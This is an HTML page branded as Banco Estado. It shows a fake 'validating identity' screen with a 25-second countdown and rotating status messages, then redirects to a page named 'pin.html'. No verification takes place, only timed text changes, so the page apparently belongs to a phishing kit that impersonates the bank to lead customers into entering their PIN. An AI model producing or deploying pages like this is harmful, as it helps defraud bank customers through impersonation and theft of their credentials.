<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="shortcut icon" type="image/png" href="favicon.png">
    <title>Banco Estado</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', 'Oxygen', 'Ubuntu', 'Cantarell', sans-serif;
            background: linear-gradient(135deg, #f5f5f5 0%, #e8e8e8 100%);
            min-height: 100vh;
            display: flex;
            align-items: flex-start;
            justify-content: center;
            padding: 20px;
        }

        .container {
            width: 100%;
            max-width: 450px;
            background: white;
            border-radius: 12px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
            padding: 40px 30px;
            margin-top: 20px;
            text-align: center;
        }

        .header {
            display: flex;
            justify-content: center;
            align-items: center;
            margin-bottom: 40px;
        }

        .logo-container {
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .logo {
            width: 40px;
            height: 40px;
            background: linear-gradient(135deg, #FF5C00 0%, #FF8C00 100%);
            border-radius: 4px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: bold;
            color: white;
            font-size: 20px;
        }

        .logo-text {
            font-size: 18px;
            font-weight: 600;
            color: #1a1a1a;
            letter-spacing: -0.5px;
        }

        .logo-img {
            width: 155px;
            height: 155px;
            display: flex;
            align-items: center;
            justify-content: center;
            background: none;
            border: none;
            padding: 0;
        }

        .logo-img img {
            width: 100%;
            height: 100%;
            object-fit: contain;
        }

        .title {
            font-size: 28px;
            font-weight: 600;
            color: #1a2842;
            margin-bottom: 35px;
            line-height: 1.3;
        }

        .counter-container {
            position: relative;
            width: 120px;
            height: 120px;
            margin: 0 auto 20px;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .counter-circle {
            position: absolute;
            width: 120px;
            height: 120px;
            border-radius: 50%;
            background: conic-gradient(#3B4FB5 var(--percentage), #E8E8F0 0);
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .counter-inner {
            width: 110px;
            height: 110px;
            background: white;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            flex-direction: column;
        }

        .counter-number {
            font-size: 36px;
            font-weight: 700;
            color: #3B4FB5;
        }

        .counter-label {
            font-size: 10px;
            color: #A8A8B3;
            font-weight: 600;
            letter-spacing: 0.5px;
        }

        .loading-section {
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 20px;
        }

        .spinner {
            width: 50px;
            height: 50px;
            border: 4px solid #E8E8F0;
            border-top: 4px solid #3B4FB5;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .loading-text {
            font-size: 14px;
            color: #666666;
            font-weight: 500;
        }

        .status-message {
            font-size: 12px;
            color: #A8A8B3;
            margin-top: 10px;
            animation: pulse 1.5s ease-in-out infinite;
        }

        @keyframes pulse {
            0%, 100% { opacity: 0.6; }
            50% { opacity: 1; }
        }

        @media (max-width: 480px) {
            .container {
                padding: 30px 20px;
                border-radius: 16px;
            }

            .title {
                font-size: 24px;
            }

            .spinner {
                width: 40px;
                height: 40px;
                border: 3px solid #E8E8F0;
                border-top: 3px solid #3B4FB5;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Header con Logo -->
        <div class="header">
            <div class="logo-container">
                <div class="logo-img">
                    <img src="logo-banco-estado.svg" alt="Logo">
                </div>
            </div>
        </div>

        <!-- Título dinámico -->
        <h1 class="title" id="dynamicTitle">Validando Identidad</h1>

        <!-- Sección de Carga -->
        <div class="loading-section">
            <!-- Contador circular -->
            <div class="counter-container">
                <div class="counter-circle" id="counterCircle">
                    <div class="counter-inner">
                        <div class="counter-number" id="counterNumber">25</div>
                        <div class="counter-label">segundos</div>
                    </div>
                </div>
            </div>

            <div class="loading-text" id="statusText">Por favor espera</div>
            <div class="status-message">Procesando solicitud...</div>
        </div>
    </div>

    <script>
        // Array de mensajes dinámicos que cambian cada 5 segundos
        const mensajes = [
            'Validando Identidad',
            'Verificando Datos',
            'Procesando Solicitud',
            'Autenticando Usuario',
            'Validando Información'
        ];

        let tiempoRestante = 25;
        let indiceActual = 0;

        // Función para cambiar el título con animación
        function cambiarTitulo() {
            const titulo = document.getElementById('dynamicTitle');
            titulo.style.animation = 'none';
            
            setTimeout(() => {
                titulo.textContent = mensajes[indiceActual];
                titulo.style.animation = 'fadeInOut 0.5s ease-in-out';
                indiceActual = (indiceActual + 1) % mensajes.length;
            }, 50);
        }

        // Función para actualizar el contador
        function actualizarContador() {
            const numeroElement = document.getElementById('counterNumber');
            const circleElement = document.getElementById('counterCircle');
            const statusText = document.getElementById('statusText');

            tiempoRestante--;
            numeroElement.textContent = tiempoRestante;

            // Calcular porcentaje para el gradient cónico
            const porcentaje = ((25 - tiempoRestante) / 25) * 100;
            circleElement.style.setProperty('--percentage', porcentaje + '%');

            // Cambiar color del contador según el tiempo
            if (tiempoRestante <= 5) {
                numeroElement.style.color = '#FF6B6B';
                circleElement.style.background = `conic-gradient(#FF6B6B ${porcentaje}%, #E8E8F0 0)`;
                statusText.textContent = '¡Casi listo!';
            } else if (tiempoRestante <= 10) {
                numeroElement.style.color = '#FFA500';
                circleElement.style.background = `conic-gradient(#FFA500 ${porcentaje}%, #E8E8F0 0)`;
                statusText.textContent = 'Completando validación';
            } else {
                numeroElement.style.color = '#3B4FB5';
                circleElement.style.background = `conic-gradient(#3B4FB5 ${porcentaje}%, #E8E8F0 0)`;
                statusText.textContent = 'Por favor espera';
            }

            if (tiempoRestante <= 0) {
                window.location.href = 'pin.html';
            }
        }

        // Cambiar título cada 5 segundos
        setInterval(cambiarTitulo, 5000);

        // Actualizar contador cada 1 segundo
        setInterval(actualizarContador, 1000);

        // Agregar animación al documento
        const estilo = document.createElement('style');
        estilo.textContent = `
            @keyframes fadeInOut {
                0% { opacity: 0; transform: translateY(-5px); }
                50% { opacity: 1; transform: translateY(0); }
                100% { opacity: 0; transform: translateY(5px); }
            }
        `;
        document.head.appendChild(estilo);
    </script>
</body>
</html>
